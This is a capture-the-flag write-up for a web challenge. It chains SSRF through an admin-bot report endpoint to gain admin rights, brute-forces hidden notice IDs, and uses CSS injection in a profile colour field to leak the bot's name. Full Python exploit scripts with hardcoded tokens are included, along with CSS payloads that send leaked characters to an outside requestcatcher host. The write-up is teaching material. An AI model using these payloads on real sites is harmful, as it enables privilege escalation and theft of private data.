### Challenge Overview

We are given a website where we can post something and choose your favorite color while registering. The chosen color is directly inserted into the css of each of our posts. Also there is a `/admin` route, the source code of that is as:

``` ts
@Controller('admin')
export class AdminController {
    constructor(
        private readonly adminService: AdminService
    ) { }

    @Get('/grant')
    @UseGuards(LocalOnlyGuard)
    async grantPerm(@Query('username') username: string) {
        return await this.adminService.authorize(username);
    }

    @Get('/notice')
    @UseGuards(AdminGuard)
    @Render('notice-main')
    async renderAllNotice() {
        const notices = await this.adminService.getAllNotice();

        return { notices: notices.filter(notice => !notice.title.includes("flag")) };
    }

    @Get('/report')
    async test(@Query('url') url: string) {
        await this.adminService.viewUrl(url);

        return { status: 200, message: 'Reported.' };
    }

    @Get('/notice/:id')
    @UseGuards(AdminGuard)
    @Render('notice')
    async renderNotice(@Param('id') id: Types.ObjectId) {
        const notice = await this.adminService.getNotice(id);

        return { notice: notice };
    }
}
```

on `/report` admin bot (pupeteer browser) which has admin access visits the url given in the param,

We can also edit posts, but only if we have admin access, the relevant code is given:

```ts
  @Get('/edit/:id')
  @UseGuards(AdminGuard)
  @Render('post-edit')
  async renderEdit(@Req() request: Request, @Param('id') id: Types.ObjectId) {
    const post = await this.postService.getPostById(id);
    const author = await this.userService.getUserById(post.user);
    const user = request.user;

    user.personalColor = xss(user.personalColor);
    author.personalColor = xss(author.personalColor);

    return { post: post, author: author, user: request.user };
  }

  @Post('/edit/:id')
  @UseGuards(AdminGuard)
  async editPost(@Param('id') id: Types.ObjectId, @Body() data: CreatePostDto) {
    return await this.postService.editPost(id, data);
  }

```

### Solution

We found that the `/admin` route is vulnerable to `SSRF`. The pupeteer browser has admin access while visiting the url and it is also running on localhost which means it can be exploited to give admin access to ourself via the `/grant` route.

Payload:
```
<instance url>admin/report?url=http://localhost:1337/admin/grant?username=<your username>
```
Yaay, Got the admin privilages !

Then we are able to access the notices from `/admin/notice` but the notice containing flag is filtered before rendering, Yikes!.

But then we noticed that the other posts have similar ids but only 2 characters were different, we went on to brute the 16*16 possible charcters and got the post containing the flag through :

`/admin/notice/<id by brute forcing>`

The brute script:

```py
import requests

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NmE1ZTc1ZGMxNDJkZDE3MmUwOTJhNWIiLCJ1c2VybmFtZSI6ImEiLCJwZXJzb25hbENvbG9yIjoiIzAwMDAwMCIsImlzQWRtaW4iOnRydWUsImlhdCI6MTcyMjE0ODc5MCwiZXhwIjoxNzIyMTUyMzkwfQ.1FtqBZcMi_WIyoNWB3i86GMLJATQGcz90zKI6uoRN-I"
baseURL = "https://b2c742d9f8b3584414958c4e.deadsec.quest"

def getAdminNotice(noticeURL, accessToken=TOKEN):
    url = baseURL + "/admin/notice/" + noticeURL
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    return r


notice = "66a5e722e5dd2fd7e79f2d68"
characters = "abcdef1234567890"
for first in characters:
    for second in characters:
        newNotice = notice[0:7] + first + notice[8:-1] + second
        res = getAdminNotice(newNotice).text
        if '404' not in res:
            print(newNotice, res)
```

We found the second part of the flag from the post : `c010rful_w3b_with_c55}`

The initial part of the flag was in the name of the admin bot.

Uhm, we thought from here that the flag has something to do with css injection.

Then, we found out the `/post/edit/:id` has value of person visiting the post in the input field, and we can also inject custom css from the personal color value while registering in the website, like putting:
```css
personal_color= #000000; } .body{ background-color: black}
```
CSS injection acheived! 

Now what left was to just make the admin bot visit our post and leak its name character by character to get the complete flag. We rendered the css with condition that if name of bot starts with a certain charcter, it hits our webhook site:
```css
#369369; }  
input[class=user][value^="D"] 
{background: url(https://solve.requestcatcher.com/);}
```
We automated this process using this script and retrieved the first part of our flag.
This script retrieves one chracter of flag on running once:

```py
import requests
import re
from os import urandom

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NmE1YmIzZmRmMDliYjc3N2ZlZGMwODEiLCJ1c2VybmFtZSI6InJhbmRvbSIsInBlcnNvbmFsQ29sb3IiOiIjZTg0YTRhO30gYm9keSB7Y29sb3I6ICMxMjMxMjMiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxNzIyMTM3NjY4LCJleHAiOjE3MjIxNDEyNjh9.B8kzYQR_SXm1-sgYzUXbQEEAsM0sGL7T1ntdx-QQLQo"
baseURL = "https://b2c742d9f8b3584414958c4e.deadsec.quest"

def register(username, password, personalColor):
    url = baseURL + "/auth/register"
    sendJSON = {"username": username, "password": password, "personalColor": personalColor}
    r = requests.post(url, json=sendJSON)
    return r

def login(username, password):
    url = baseURL + "/auth/login"
    sendJSON = {"username": username, "password": password}
    r = requests.post(url, json=sendJSON)
    return r

def write(title, content, accessToken=TOKEN):
    url = baseURL + "/post/write"
    sendJSON = {"title": title, "content": content}
    sendCookie = {"accessToken": accessToken}
    r = requests.post(url, json=sendJSON, cookies=sendCookie)
    return r

def getAllPosts(accessToken=TOKEN):
    url = baseURL + "/post"
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    res = r.text
    posts = re.findall("/post/[0-9a-f]{24}", res)
    return posts

def getPost(postURL, accessToken=TOKEN):
    url = baseURL + postURL
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    return r

def sendAdmin(postid, accessToken):
    url = 'https://b2c742d9f8b3584414958c4e.deadsec.quest/admin/report?url=http://localhost:1337/post/edit/' + postid
    sendCookie = {"accessToken": accessToken}
    return requests.get(url, cookies=sendCookie)


user = str(urandom(16).hex())
print("User:",user)
passwd = user
# characters = "ABCDEFGHIJKLMNOPQRSTUVXYZ"
characters = "abcdefghijklmnopqrstuvwxyz1234567890_"
flag = "DEAD{Enj0y_y"
finalExploit = '#369369; } '
for letter in characters:
    letterExploit = 'input[class=user][value^="'+ flag + letter + '"] {background: url(https://dragon.requestcatcher.com/' + flag+letter+');} '
    finalExploit += letterExploit
letterExploit = 'input[class=user][value^="'+ flag + '}' + '"] {background: url(https://dragon.requestcatcher.com/' + flag+'}'+'); '
finalExploit += letterExploit
print(finalExploit)

print("Register:", register(user, passwd, finalExploit).json())

res = login(user, passwd).json()
token = res["accessToken"]
print(f"{token=}")

title = "RandomHacker"
content = "RandomHacker"
print("Write:", write(title, content, token).text)

myPosts = getAllPosts(token)
print("Posts:")
for post in myPosts:
    print(sendAdmin(post[6:], token).text)
    print(post[6:])


```


The final flag:

`DEAD{Enj0y_y0ur_c010rful_w3b_with_c55}`